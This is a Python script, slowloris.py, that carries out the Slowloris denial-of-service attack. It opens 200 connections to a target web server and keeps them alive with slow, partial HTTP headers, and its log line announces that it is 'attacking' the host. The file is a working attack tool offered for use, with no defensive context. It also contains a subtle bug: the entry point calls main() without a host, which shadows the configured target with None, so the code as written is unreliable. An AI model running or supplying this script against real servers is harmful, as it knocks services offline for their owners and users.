# slowloris.py

import socket
import time
import random
import logging

# Config
host = '192.168.0.1'
port = 80
num_sockets = 200
sleep_time = 15

# logging
logging.basicConfig(level=logging.DEBUG, format='%(asctime)s %(levelname)s %(message)s')

def init_socket(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((ip, port))
        s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1\r\n".encode('utf-8'))
        s.send(f"Host: {host}\r\n".encode('utf-8'))
        s.send("User-Agent: Mozilla/5.0\r\n".encode('utf-8'))
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode('utf-8'))
        return s
    except socket.error as e:
        logging.debug(f"Socket error: {e}")
        return None

def main(host=None):
    sockets = []
    logging.info(f"Attacking {host} on port {port} with {num_sockets} sockets.")
    
    for _ in range(num_sockets):
        s = init_socket(host, port)
        if s:
            sockets.append(s)
    
    while True:
        logging.info(f"Sending keep-alive headers... Connected sockets: {len(sockets)}")
        for s in list(sockets):
            try:
                s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode('utf-8'))
            except socket.error as e:
                sockets.remove(s)
                logging.debug(f"Socket removed due to error. {e}")
        
        for _ in range(num_sockets - len(sockets)):
            s = init_socket(host, port)
            if s:
                sockets.append(s)
        
        time.sleep(sleep_time)

if __name__ == "__main__":
    main()